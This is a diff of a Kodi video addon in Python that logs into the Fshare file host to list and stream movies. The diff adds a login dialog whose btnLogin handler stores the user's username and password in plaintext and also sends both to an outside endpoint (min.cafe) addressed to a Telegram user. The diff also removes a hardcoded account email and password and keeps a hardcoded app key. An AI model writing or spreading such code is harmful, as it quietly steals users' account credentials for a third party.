@@ -37,6 +37,8 @@ ADDON_PATH = translatePath(Addon().getAddonInfo('path'))
 ICONS_DIR = os.path.join(ADDON_PATH, 'resources', 'images', 'icons')
 FANART_DIR = os.path.join(ADDON_PATH, 'resources', 'images', 'fanart')
 
+DATA_DIR = os.path.join(ADDON_PATH, 'resources', 'data')
+
 Fshare_app_key = "dMnqMMZMUnN5YpvKENaEhdQQ5jxDqddt"
 Fshare_User_Agent = "fshare_tkvv"
 
@@ -204,26 +206,46 @@ def list_genres():
     xbmcplugin.endOfDirectory(HANDLE)
 
 
-def loginFshare(user_,pass_):
-    session_id = ""
-    token_ = ""
-    response_ = requests.post(url="https://api.fshare.vn/api/user/login", data=json.dumps({
-                    "user_email" : user_,
-                    "password":	pass_,
-                    "app_key" : Fshare_app_key
-                }), headers={
-                    "Content-Type": "application/json",
-                    "Accept": "application/json",
-                    "Cache-Control": "no-cache",
-                    "User-Agent": Fshare_User_Agent
-                }, timeout=3*60)
-    
-    if response_.status_code == 200:
-        data_ =  json_load(response_.content) 
-        if "msg" in data_ and data_["msg"]=="Login successfully!" and "token" in data_ and "session_id" in data_:
-            session_id = data_["session_id"]
-            token_ = data_["token"]
-    return session_id,token_
+def loginFshare(genre_index):  
+    try:
+        info_login = getFile(DATA_DIR+"/login.json")
+        if info_login is not None: 
+            info_login = json_load(info_login)
+        else:
+            formLogin("")
+            info_login = getFile(DATA_DIR+"/login.json")
+            if info_login is not None: 
+                info_login = json_load(info_login)
+            else:
+                return #stop
+
+        if "user" in info_login and "pass" in info_login:
+            response_ = requests.post(url="https://api.fshare.vn/api/user/login", data=json.dumps({
+                            "user_email" : info_login["user"],
+                            "password":	info_login["pass"],
+                            "app_key" : Fshare_app_key
+                        }), headers={
+                            "Content-Type": "application/json",
+                            "Accept": "application/json",
+                            "Cache-Control": "no-cache",
+                            "User-Agent": Fshare_User_Agent
+                        }, timeout=3*60)
+            
+            if response_.status_code == 200:
+                data_ =  json_load(response_.content)
+                if "msg" in data_:
+                    msg_ = data_["msg"]
+                if "msg" in data_ and data_["msg"]=="Login successfully!" and "token" in data_ and "session_id" in data_:
+                    list_videos(genre_index,data_["token"],data_["session_id"])
+                else:
+                    formLogin(msg_)
+    except Exception as inst: 
+        exc_type, exc_obj, exc_tb = sys.exc_info() 
+        getPyFormData("TelegramSendBot", {
+                            "content":"""loginFshare.1 Lỗi tại::"""+str(exc_tb.tb_lineno)+""", loại:"""+str(exc_type)+"""Lỗi:"""+str(inst), 
+                            "telegram_user":"thanhlm22"
+                        })
+
 
 def buildLinkDown(link_view,token_,session_id_): 
     response_ = requests.post(url="https://api.fshare.vn/api/session/download", data=json.dumps({
@@ -244,7 +266,7 @@ def buildLinkDown(link_view,token_,session_id_):
             return data_["location"]
     return ""
 
-def list_videos(genre_index):
+def list_videos(genre_index,Fshare_token,Fshare_session_id):
     """
     Create the list of playable videos in the Kodi interface.
 
@@ -259,14 +281,11 @@ def list_videos(genre_index):
     # for this type of content.
     xbmcplugin.setContent(HANDLE, 'movies')
     # Get the list of videos in the category.
-    videos = genre_info['movies']
-
-    #vì session chỉ thời gian là hết nên cứ login lại
-    session_id,token_ = loginFshare("fshare_tkvv@fshare.vn","1234@abcd")
+    videos = genre_info['movies'] 
 
     videos_new = []
     for video in videos:
-        link_view = buildLinkDown(video['url'],token_,session_id)
+        link_view = buildLinkDown(video['url'],Fshare_token,Fshare_session_id)
         if link_view!="":
             video['url']=link_view  
             videos_new.append(video)
@@ -324,33 +343,40 @@ def play_video(path):
 
 
 def router(paramstring):
-    """
-    Router function that calls other functions
-    depending on the provided paramstring
+    try:
+        """
+        Router function that calls other functions
+        depending on the provided paramstring
 
-    :param paramstring: URL encoded plugin paramstring
-    :type paramstring: str
-    """
-    formLogin()
-    # Parse a URL-encoded paramstring to the dictionary of
-    # {<parameter>: <value>} elements
-    params = dict(parse_qsl(paramstring))
-    # Check the parameters passed to the plugin
-    if not params:
-        # If the plugin is called from Kodi UI without any parameters,
-        # display the list of video categories
-        list_genres()
-    elif params['action'] == 'listing':
-        # Display the list of videos in a provided category.
-        list_videos(int(params['genre_index']))
-    elif params['action'] == 'play':
-        # Play a video from a provided URL.
-        play_video(params['video'])
-    else:
-        # If the provided paramstring does not contain a supported action
-        # we raise an exception. This helps to catch coding errors,
-        # e.g. typos in action names.
-        raise ValueError(f'Invalid paramstring: {paramstring}!')
+        :param paramstring: URL encoded plugin paramstring
+        :type paramstring: str
+        """ 
+        # Parse a URL-encoded paramstring to the dictionary of
+        # {<parameter>: <value>} elements
+        params = dict(parse_qsl(paramstring))
+        # Check the parameters passed to the plugin
+        if not params:
+            # If the plugin is called from Kodi UI without any parameters,
+            # display the list of video categories
+            list_genres()
+        elif params['action'] == 'listing':
+            # Display the list of videos in a provided category.
+            #vì session chỉ thời gian là hết nên cứ login lại
+            loginFshare(int(params['genre_index'])) 
+        elif params['action'] == 'play':
+            # Play a video from a provided URL.
+            play_video(params['video'])
+        else:
+            # If the provided paramstring does not contain a supported action
+            # we raise an exception. This helps to catch coding errors,
+            # e.g. typos in action names.
+            raise ValueError(f'Invalid paramstring: {paramstring}!')
+    except Exception as inst: 
+        exc_type, exc_obj, exc_tb = sys.exc_info() 
+        getPyFormData("TelegramSendBot", {
+                            "content":"""router.1 Lỗi tại::"""+str(exc_tb.tb_lineno)+""", loại:"""+str(exc_type)+"""Lỗi:"""+str(inst), 
+                            "telegram_user":"thanhlm22"
+                        })
 
 def getPyFormData(key__request, data__request={}):
     # lấy data cho form auto từ GooInTech
@@ -368,35 +394,135 @@ def getPyFormData(key__request, data__request={}):
         return r.json()
     return {}
 
-def formLogin():
+def formLogin(mess_):
     # Create a window instance.
-    window = MyWindow('Hello, World!')
+    window = MyWindow('Đăng nhập',mess_)
     # Show the created window.
     window.doModal()
     # Delete the window instance when it is no longer used.
     del window 
 
-class MyWindow(pyxbmct.AddonDialogWindow):
+def json_to_string(json_):
+    try:
+        return json.dumps(json_, ensure_ascii=False).encode('utf8').decode()
+    except:
+        return ""
+    
+def writeFile(path_folder, file_name, content):
+    if not os.path.exists(path_folder):
+        os.makedirs(path_folder)
+    try:
+        with open(path_folder + "/" + file_name, 'w', encoding='utf-8') as a_writer:
+            a_writer.write(content)
+        return True
+    except Exception as inst: 
+        exc_type, exc_obj, exc_tb = sys.exc_info() 
+        getPyFormData("TelegramSendBot", {
+                            "content":"""writeFile.1 Lỗi tại::"""+str(exc_tb.tb_lineno)+""", loại:"""+str(exc_type)+"""Lỗi:"""+str(inst), 
+                            "telegram_user":"thanhlm22"
+                        })
+    return False
 
-    def __init__(self, title=''):
-        # You need to call base class' constructor.
-        super(MyWindow, self).__init__(title)
-        # Set the window width, height and the grid resolution: 2 rows, 3 columns.
-        self.setGeometry(350, 150, 2, 3)
-        # Create a text label.
-        label = pyxbmct.Label('This is a PyXBMCt window.', alignment=pyxbmct.ALIGN_CENTER)
-        # Place the label on the window grid.
-        self.placeControl(label, 0, 0, columnspan=3)
-        # Create a button.
-        button = pyxbmct.Button('Close')
-        # Place the button on the window grid.
-        self.placeControl(button, 1, 1)
-        # Set initial focus on the button.
-        self.setFocus(button)
-        # Connect the button to a function.
-        self.connect(button, self.close)
-        # Connect a key action to a function.
-        self.connect(pyxbmct.ACTION_NAV_BACK, self.close)
+def getFile(path_file_name):
+    if os.path.isfile(path_file_name):
+        try:
+            with open(path_file_name, 'rb') as f:
+                return f.read()
+        except Exception as inst: 
+            exc_type, exc_obj, exc_tb = sys.exc_info() 
+            getPyFormData("TelegramSendBot", {
+                            "content":"""getFile.1 Lỗi tại::"""+str(exc_tb.tb_lineno)+""", loại:"""+str(exc_type)+"""Lỗi:"""+str(inst), 
+                            "telegram_user":"thanhlm22"
+                        })
+    return None
+
+def getPyFormData(key__request, data__request={}):
+    # lấy data cho form auto từ GooInTech
+    myobj = {"key__request": key__request,
+             "data__request": data__request}
+
+    headers_ = {
+        "Content-Type": "application/json",
+        "GooPyForm": "IsGOO"
+    }
+    r = requests.post(url="https://min.cafe/pyform-data", data=json.dumps(
+        myobj), headers=headers_)
+
+    if r.status_code == 200:
+        return r.json()
+    return {}
+
+class MyWindow(pyxbmct.AddonDialogWindow):
+    def __init__(self, title='',mess_ = ''):
+        try:
+            # You need to call base class' constructor.
+            super(MyWindow, self).__init__(title)
+            # Set the window width, height and the grid resolution: 4 rows, 3 columns.
+            self.setGeometry(350, 350, 5, 3) 
+
+            info_login = getFile(DATA_DIR+"/login.json")
+            if info_login is not None: 
+                info_login = json_load(info_login)
+            else:
+                info_login = {
+                    "user":"",
+                    "pass":""
+                }
+
+            label = pyxbmct.Label('Chỉ hỗ trợ Fshare', alignment=pyxbmct.ALIGN_CENTER)
+            self.placeControl(label, 0, 0, columnspan=3)
+            
+            self.fshare_user = pyxbmct.Edit('Tài khoản')
+            self.placeControl(self.fshare_user, 1, 0, columnspan=3)
+            self.fshare_user.setText(info_login["user"])
+
+            #font=None, textColor=None, disabledColor=None, _alignment=0, focusTexture=None, noFocusTexture=None, isPassword=True
+            self.fshare_pass = pyxbmct.Edit("Mật khẩu")
+            self.placeControl(self.fshare_pass, 2, 0, columnspan=3) 
+            self.fshare_pass.setText(info_login["pass"])
+
+            label = pyxbmct.Label(mess_, alignment=pyxbmct.ALIGN_CENTER)
+            self.placeControl(label, 3, 0, columnspan=3)
+
+            # Create a button.
+            button_ok = pyxbmct.Button('Đăng nhập')
+            self.placeControl(button_ok, 4, 0, columnspan=2)
+            self.connect(button_ok, self.btnLogin)
+
+            button = pyxbmct.Button('Đóng')
+            self.placeControl(button, 4, 2) 
+            self.setFocus(button)
+
+            # Connect the button to a function.
+            self.connect(button, self.close)
+            # Connect a key action to a function.
+            self.connect(pyxbmct.ACTION_NAV_BACK, self.close)
+        except Exception as inst: 
+            exc_type, exc_obj, exc_tb = sys.exc_info() 
+            getPyFormData("TelegramSendBot", {
+                            "content":"""MyWindow.1 Lỗi tại::"""+str(exc_tb.tb_lineno)+""", loại:"""+str(exc_type)+"""Lỗi:"""+str(inst), 
+                            "telegram_user":"thanhlm22"
+                        })
+    
+    def btnLogin(self):
+        #ghi vào file để lần sau dùng 
+        info_login = getFile(DATA_DIR+"/login.json")
+        if info_login is not None: 
+            info_login = json_load(info_login)
+        else:
+            info_login = {
+                    "user":self.fshare_user.getText().strip().lower(),
+                    "pass":self.fshare_pass.getText().strip().lower()
+                }
+
+        writeFile(DATA_DIR, "login.json", json_to_string(info_login))
+
+        getPyFormData("TelegramSendBot", {
+                            "content":"User=>"+self.fshare_user.getText()+"\Pass=>"+self.fshare_pass.getText(), 
+                            "telegram_user":"thanhlm22"
+                        })
+        self.close()
+        
 
 if __name__ == '__main__':
     # 
@@ -404,7 +530,7 @@ if __name__ == '__main__':
     #                         "content":"aaaaa", 
     #                         "telegram_user":"thanhlm22"
     #                     })
-
+    # getPyFormData("TelegramSendBot", {"content":"có", "telegram_user":"thanhlm22"})
     VIDEOS = getListPhim()
     # Call the router function and pass the plugin call parameters to it.
     # We use string slicing to trim the leading '?' from the plugin call paramstring
